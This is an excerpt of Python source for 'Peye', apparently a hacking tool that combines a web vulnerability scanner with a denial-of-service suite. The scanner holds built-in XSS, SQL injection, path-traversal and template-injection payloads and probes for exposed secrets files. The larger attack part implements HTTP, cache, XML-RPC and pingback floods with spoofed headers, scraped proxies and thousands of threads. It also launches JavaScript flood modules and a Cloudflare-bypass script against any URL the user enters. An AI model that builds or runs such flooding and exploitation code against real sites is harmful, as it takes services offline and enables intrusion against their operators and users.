...
def print_banner():
    banner = f"""
{RED}██████╗ ███████╗██╗   ██╗███████╗    {YELLOW}v{VERSION}{RESET}
{RED}██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝    {CYAN}Advanced Security Suite{RESET}
{RED}██████╔╝█████╗   ╚████╔╝ █████╗      {WHITE}Smart Validation Engine{RESET}
{RED}██╔═══╝ ██╔══╝    ╚██╔╝  ██╔══╝      {MAGENTA}Expanded DoS + BYC.js{RESET}
{RED}██║     ███████╗   ██║   ███████╗     
{RED}╚═╝     ╚══════╝   ╚═╝   ╚══════╝     
{YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
{CYAN}║ {WHITE}Author: peyefounder | IG: @hexornot{RESET}                        {CYAN}║{RESET}
{CYAN}║ {WHITE}Features: Smart Scan (0-100%) | BYC Integration | DoS++{RESET}    {CYAN}║{RESET}
{YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}
"""
    print(banner)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║     {MAGENTA} Welcome To Peye v{VERSION} {RESET}{CYAN}                   ║")
    print(f"║     {GREEN}Tools Vuln Site Scanner Or ddos by (peyefounder){RESET}{CYAN}             ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}\n")
...
class WordlistManager:
    ...
    def load_wordlists(self):
        wordlist_files = {
            'xss': 'xss.txt', 'sqli': 'sqli.txt', 'lfi': 'lfi.txt',
            'xxe': 'xxe.txt', 'ssti': 'ssti.txt', 'xslt': 'xslt.txt',
            'ssi_esi': 'ssi_esi.txt', 'bypass403': 'bypass403.txt',
            'dirs': 'dirs.txt', 'subdomains': 'subdomains.txt',
            'dorks': 'dork.txt', 'useragents': 'useragent.txt'
        }
        ...
        self.internal_xss = ['<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', "'-alert(1)-'"]
        self.internal_sqli = ["' OR '1'='1", "1 UNION SELECT NULL--", "1' AND SLEEP(5)--"]
        self.internal_lfi = ["../../../etc/passwd", "..\\..\\windows\\win.ini", "/proc/self/environ"]
        self.internal_dirs = ['admin', 'login', 'wp-admin', 'dashboard', 'cpanel', 'api']
        self.internal_subdomains = ['www', 'mail', 'ftp', 'admin', 'dev', 'staging', 'api']
        self.internal_bypass403 = ['/', '/%2e/', '/..;/', '/./']
        self.internal_cors = ['*', 'https://evil.com', 'null']
        ...
        print(f"{GREEN}[✓] Internal lists ready{RESET}")
    
    def get(self, name):
        if name in self.wordlists and self.wordlists[name]:
            return self.wordlists[name]
        mapping = {
            'xss': self.internal_xss, 'sqli': self.internal_sqli,
            'lfi': self.internal_lfi, 'dirs': self.internal_dirs,
            'subdomains': self.internal_subdomains, 'bypass403': self.internal_bypass403,
            'cors': self.internal_cors, 'env': self.internal_env,
            'config': self.internal_config, 'backup': self.internal_backup
        }
        return mapping.get(name, [])

class SmartValidator:
    @staticmethod
    def calculate_confidence(response, payload, vuln_type, base_content_length=0):
        score = 0
        details = []
        ...
        signatures = {
            'sqli': ['sql syntax', 'mysql_fetch', 'ora-01756', 'sqlite3.operationalerror', 'unclosed quotation mark'],
            'xss': ['<script>', 'onerror=', 'javascript:', 'alert('],
            'lfi': ['root:x:', '[boot loader]', 'daemon=', 'bin/bash'],
            'ssti': ['49', 'config', 'secret_key', 'jinja2'],
            'xxe': ['root:x:', 'file://', 'entity']
        }
        
        if vuln_type.lower() in signatures:
            for sig in signatures[vuln_type.lower()]:
                if sig in text:
                    score += 35
                    details.append(f"Signature: {sig}")
                    break
        
        if base_content_length > 0:
            diff = abs(len(response.content) - base_content_length)
            if diff > 500: 
                score += 15
                details.append(f"Size Delta: {diff}b")
        
        if status == 200:
            score += 10
        elif status == 500 and vuln_type in ['sqli', 'xxe']:
            score += 10
...
class VulnerabilityReport:
    ...
    def add(self, vuln_type, url, payload, confidence, detail=""):
        self.findings.append({
            'type': vuln_type, 'url': url, 'payload': payload, 
    ...
    def display(self):
        if not self.findings:
            print(f"\n{GREEN}[✓] No high-confidence vulnerabilities found.{RESET}")
            return
            
        sorted_findings = sorted(self.findings, key=lambda x: x['confidence'], reverse=True)
        
        print(f"\n{RED}{'='*70}{RESET}")
        print(f"{YELLOW}[!] SMART SCAN RESULTS (Sorted by Confidence){RESET}")
        print(f"{RED}{'='*70}{RESET}")
        
        for i, vuln in enumerate(sorted_findings, 1):
            conf_color = GREEN if vuln['confidence'] >= 80 else YELLOW if vuln['confidence'] >= 50 else RED
            print(f"\n{CYAN}[{i}] {BOLD}{vuln['type']}{RESET} | {conf_color}Confidence: {vuln['confidence']}%{RESET}")
            print(f"    {WHITE}URL:{RESET} {vuln['url']}")
            print(f"    {WHITE}Payload:{RESET} {YELLOW}{vuln['payload'][:80]}{RESET}")
            if vuln['detail']:
                print(f"    {WHITE}Evidence:{RESET} {vuln['detail']}")
                
        print(f"\n{RED}{'='*70}{RESET}")
        filename = f"peye_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write(f"PEYE v{VERSION} Smart Scan Report\nTarget: {self.target}\n{'='*70}\n\n")
            for v in sorted_findings:
                f.write(f"[{v['confidence']}%] {v['type']} | {v['url']}\nPayload: {v['payload']}\nEvidence: {v['detail']}\n\n")
...
class AdvancedScanner:
    ...
    def init_baseline(self):
        try:
            self.base_response = self.session.get(self.target, timeout=10)
            print(f"{GREEN}[✓] Baseline established ({len(self.base_response.content)} bytes){RESET}")
        except Exception as e:
            print(f"{RED}[✗] Failed to establish baseline: {e}{RESET}")
    ...
    def smart_vuln_scan(self, vuln_type, payloads, param='q', method='GET'):
        if not payloads:
            print(f"{YELLOW}[!] No {vuln_type} payloads loaded{RESET}")
            return []
        print(f"\n{CYAN}[*] Smart Scanning {vuln_type} ({len(payloads)} payloads)...{RESET}")
        ...
        base_len = len(self.base_response.content) if self.base_response else 0
        found = []
        total = len(payloads)
        ...
        def test_payload(payload):
            try:
                if method.upper() == 'GET':
                    ...
                    test_url = f"{self.target}{sep}{param}={quote(payload)}"
                    resp = self.session.get(test_url, timeout=8)
                else:
                    test_url = self.target
                    resp = self.session.post(test_url, data={param: payload}, timeout=8)
                
                confidence, evidence = SmartValidator.calculate_confidence(
                    resp, payload, vuln_type, base_len
                )
                
                if confidence >= 60:
                    return (payload, test_url, confidence, evidence)
            except Exception:
                pass
            return None
        ...
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            ...
            for i, future in enumerate(as_completed(futures), 1):
                ...
                if result:
                    payload, test_url, conf, ev = result
                    found.append(payload)
                    self.report.add(vuln_type, test_url, payload, conf, ev)
                    conf_color = GREEN if conf >= 80 else YELLOW
                    print(f"\n    {conf_color}[{conf}%]{RESET} {BOLD}{vuln_type} VULNERABLE!{RESET}")
                    print(f"    {WHITE}URL:{RESET} {test_url}")
                    print(f"    {WHITE}Payload:{RESET} {YELLOW}{payload[:80]}{RESET}")
                    print(f"    {WHITE}Evidence:{RESET} {ev}")
                if i % 50 == 0:
                    print(f"{WHITE}[*] Progress: {i}/{total} ({i*100//total}%){RESET}", end='\r')
        print(f"\n{GREEN}[✓] {vuln_type} Complete: {len(found)}/{total} potential issues{RESET}")
        return found
    
    def scan_misc(self):
        print(f"\n{CYAN}[*] Scanning Misc Vulnerabilities...{RESET}")
        ...
        for origin in origins:
            try:
                ...
                if resp.headers.get('Access-Control-Allow-Origin') in [origin, '*']:
                    self.report.add("CORS", self.target, origin, 90, "Misconfigured ACAO Header")
        ...
        try:
            ...
            if resp.status_code == 200 and 'X-Frame-Options' not in resp.headers:
                self.report.add("Clickjacking", self.target, "", 85, "Missing X-Frame-Options")
                print(f"{RED}[!] Clickjacking Possible{RESET}")
        except Exception:
            pass
        
        files = self.wordlists.get('env') + self.wordlists.get('config') + self.wordlists.get('backup')
        for file in files:
            ...
            try:
                ...
                if resp.status_code == 200:
                    conf = 90
                    if 'DB_' in resp.text or 'APP_KEY' in resp.text: conf = 98
                    self.report.add("Sensitive File", url, "", conf, "HTTP 200")
                    print(f"{RED}[!] Sensitive File Found: {url}{RESET}")
            except Exception:
                pass
        
        print(f"{GREEN}[✓] Misc scan complete{RESET}")
    
    def full_scan(self):
        print(f"\n{MAGENTA}{'='*70}{RESET}")
        print(f"{YELLOW}[*] INITIATING SMART FULL SCAN: {self.target}{RESET}")
        ...
        self.init_baseline()
        self.smart_vuln_scan('XSS', self.wordlists.get('xss'), 'q')
        self.smart_vuln_scan('SQLi', self.wordlists.get('sqli'), 'id')
        self.smart_vuln_scan('LFI', self.wordlists.get('lfi'), 'file')
        self.smart_vuln_scan('XXE', self.wordlists.get('xxe'), 'xml', method='POST')
        self.smart_vuln_scan('SSTI', ['{{7*7}}', '${7*7}', '{{config}}'], 'name')
        self.scan_misc()
    ...
    def scrape_proxies(self):
        ...
        for source in sources:
            try:
                ...
                continue
        if proxies:
            self.proxies = list(set(proxies))[:300]
...
class HardenedDoS:
    ...
    def _generate_headers(self):
        return {
            'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.{random.randint(1,99)} Chrome/{random.randint(80,120)}.0.0.0 Safari/537.36",
            ...
            'Cookie': f"session={''.join(random.choices('abcdef0123456789', k=32))}; token={''.join(random.choices('abcdef0123456789', k=16))}",
            'Connection': 'keep-alive'
        }

    def http_get(self, duration, threads):
        self._attack("HARDENED HTTP GET", duration, threads, self._http_get_worker)
    
    def http_post(self, duration, threads):
        self._attack("HARDENED HTTP POST", duration, threads, self._http_post_worker)
    
    def http_head(self, duration, threads):
        self._attack("HARDENED HTTP HEAD", duration, threads, self._http_head_worker)
    
    def http_random(self, duration, threads):
        self._attack("HARDENED HTTP RANDOM", duration, threads, self._http_random_worker)
    ...
    def mixed_flood(self, duration, threads):
        self._attack("MIXED VECTOR", duration, threads, self._mixed_worker)
    
    def xmlrpc_flood(self, duration, threads):
        self._attack("XML-RPC FLOOD", duration, threads, self._xmlrpc_worker)
    
    def pingback_flood(self, duration, threads):
        self._attack("PINGBACK FLOOD", duration, threads, self._pingback_worker)
    ...
    def all_attacks(self, duration, threads):
        ...
        thr_each = max(1, threads // 9)
        attacks = [self.http_get, self.http_post, self.http_head, self.slowloris, 
                   self.cache_flood, self.mixed_flood, self.xmlrpc_flood, 
                   self.pingback_flood, self.slow_read]
    ...
    def _http_post_worker(self, end_time):
        ...
        while self.running and time.time() < end_time:
            try:
                ...
                headers = self._generate_headers()
                url = self._add_saa(self.target)
                data = {'username': 'admin', 'password': ''.join(random.choices('abc123', k=20)), 'token': 'x'*1024}
                session.post(url, data=data, headers=headers, timeout=2)
                self.stats.add(True)
            except Exception:
                self.stats.add(False)
    ...
    def _http_random_worker(self, end_time):
        ...
        while self.running and time.time() < end_time:
            try:
                ...
                url = self._add_saa(self.target)
                session.request(method, url, headers=headers, timeout=2)
                self.stats.add(True)
            except Exception:
                self.stats.add(False)
    ...
    def _cache_worker(self, end_time):
        ...
        while self.running and time.time() < end_time:
            try:
                ...
                if proxy: session.proxies = proxy
                headers = self._generate_headers()
                headers.update({'Cache-Control': 'no-cache, no-store, must-revalidate', 'Pragma': 'no-cache'})
                url = self._add_saa(self.target)
                session.get(url, headers=headers, timeout=2)
                self.stats.add(True)
            except Exception:
    ...
    def _xmlrpc_worker(self, end_time):
        ...
        while self.running and time.time() < end_time:
            try:
                ...
                session.post(url, data=xml_payload, headers=headers, timeout=2)
                self.stats.add(True)
            except Exception:
                self.stats.add(False)
    
    def _pingback_worker(self, end_time):
        session = requests.Session()
        session.verify = False
        while self.running and time.time() < end_time:
            try:
                ...
                if proxy: session.proxies = proxy
                headers = self._generate_headers()
                xml_payload = f"""<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value>{self.target}</value></param><param><value>{self.target}/?p=1</value></param></params></methodCall>"""
                headers['Content-Type'] = 'text/xml'
                url = urljoin(self.target, '/xmlrpc.php')
                session.post(url, data=xml_payload, headers=headers, timeout=2)
                self.stats.add(True)
    ...
    def _attack(self, name, duration, threads, worker_func):
        ...
        try:
            while time.time() < end:
                ...
                print(f"\r{WHITE}[{CYAN}*{WHITE}] {YELLOW}Req: {self.stats.total:,} | {BLUE}RPS: {rps:.0f} | {RED}Fail: {self.stats.failed}{RESET}", end='', flush=True)
                time.sleep(1)
        ...
        elapsed = time.time() - start
        rps = self.stats.total / elapsed if elapsed > 0 else 0
        print(f"\n\n{GREEN}[✓] Attack Finished | Total: {self.stats.total:,} | Avg RPS: {rps:.0f} | {elapsed:.1f}s{RESET}\n")

class JSModuleCaller:
    @staticmethod
    def run_byc(target):
        if not os.path.exists('byc.js'):
            print(f"{RED}[✗] byc.js not found in current directory!{RESET}")
            return False
        
        print(f"\n{CYAN}[*] Running BYC.js Cloudflare Bypass for: {target}{RESET}")
        cmd = ['node', 'byc.js', target]
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            while process.poll() is None:
                output = process.stdout.readline()
                if output:
                    print(f"{WHITE}[BYC] {output.strip()}{RESET}")
            if process.returncode == 0:
                print(f"{GREEN}[✓] BYC.js completed successfully{RESET}")
                return True
            else:
                err = process.stderr.read()
                print(f"{RED}[✗] BYC.js error: {err}{RESET}")
                return False
        except FileNotFoundError:
            print(f"{RED}[✗] Node.js not found. Install Node.js to use BYC.js{RESET}")
            return False
        except Exception as e:
            print(f"{RED}[✗] Error running BYC.js: {e}{RESET}")
            return False
...
class DorkSearch:
    ...
    def tech_search(self, tech_name):
        tech_dorks = {
            'wordpress': 'inurl:wp-content', 'laravel': 'inurl:.env',
            'jquery': 'inurl:jquery.js', 'php': 'ext:php',
            'nginx': 'Server: nginx', 'apache': 'Server: Apache',
            'admin': 'inurl:admin login', 'config': 'ext:config OR ext:env',
            'backup': 'ext:sql OR ext:bak', 'database': 'inurl:phpmyadmin'
        }
...
class Peye:
    ...
    def menu(self):
        proxy_status = f"{GREEN}ON{RESET}" if self.use_proxy else f"{RED}OFF{RESET}"
        saa_status = f"{GREEN}ON{RESET}" if self.saa_enabled else f"{RED}OFF{RESET}"
        print(f"""
{YELLOW}╔══════════════════════════════════════════════════════════════════╗
║ {WHITE} PEYE v{VERSION} CORE ENGINE | PROXY: {proxy_status} | SAA: {saa_status}{RESET}{YELLOW}           ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[🛡️ SMART SCANNER (ACCURACY 0-100%)]{RESET}{YELLOW}                              ║
║ {CYAN}[1] {WHITE}Full Smart Scan (XSS/SQLi/LFI/SSTI/Bypass)                  ║
║ {CYAN}[2] {WHITE}Custom Payload Injection Test                               ║
║ {CYAN}[3] {WHITE}CSRF | CORS | Clickjacking | Sensitive Files                ║
...
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 HARDENED DoS - PYTHON (EXPANDED++)]{RESET}{YELLOW}                             ║
...
║ {CYAN}[25] {WHITE}XML-RPC Flood           [26] {WHITE}Pingback Flood               ║
║ {CYAN}[27] {WHITE}Slow Read                                              ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[💥 DoS ATTACK - JS MODULES]{RESET}{YELLOW}                                          ║
║ {CYAN}[28] {WHITE}HTTP/2 Flood (h2flood.js)                                       ║
║ {CYAN}[29] {WHITE}CF Bypass (cf-proo.js)                                          ║
║ {CYAN}[30] {WHITE}UAM Flood (uam.js)                                              ║
║ {CYAN}[31] {WHITE}HTTP/2 Attack (http2.js)                                        ║
║ {CYAN}[32] {WHITE}Generic Flood (flood.js)                                        ║
║ {CYAN}[33] {WHITE}Slow Flood (s-flood.js)                                         ║
║ {CYAN}[34] {WHITE}Slowloris+TCP (st-flood.js)                                     ║
╠══════════════════════════════════════════════════════════════════╣
║ {MAGENTA}[🔓 BYPASS CLOUDFLARE]{RESET}{YELLOW}                                                ║
║ {CYAN}[35] {WHITE}Run BYC.js (Cloudflare Bypass HTTPS)                          ║
╠══════════════════════════════════════════════════════════════════╣
║ {CYAN}[S] {WHITE}Toggle SAA | [P] Toggle Proxy | [U] Update | [0] Exit{RESET}{YELLOW}          ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
""")
        ...
        while True:
            ...
            if choice in ['1','2','3','4']:
                ...
                if choice == '1':
                    ...
                    pt = input("Type (xss/sqli/lfi/ssti): ").strip()
                    pl = input("Payload: ").strip()
                    scanner.smart_vuln_scan(pt.upper(), [pl])
            ...
            elif choice in [str(i) for i in range(15, 28)]:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'http://' + target
                ...
                dos = HardenedDoS(target, self.use_proxy)
                if self.saa_enabled:
                    dos.enable_saa()
                ...
                attack_map = {
                    ...
                    '24': dos.down_site, '25': dos.xmlrpc_flood, '26': dos.pingback_flood,
                    '27': dos.slow_read
                }
                if choice in attack_map:
                    attack_map[choice](dur, min(thr, 5000))
            
            elif choice in [str(i) for i in range(28, 35)]:
                target = input(f"{GREEN}Target URL: {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'https://' + target
                ...
                target = input(f"{GREEN}Target URL (HTTPS): {RESET}").strip()
                if not target.startswith(('http://','https://')):
                    target = 'https://' + target
                JSModuleCaller.run_byc(target)
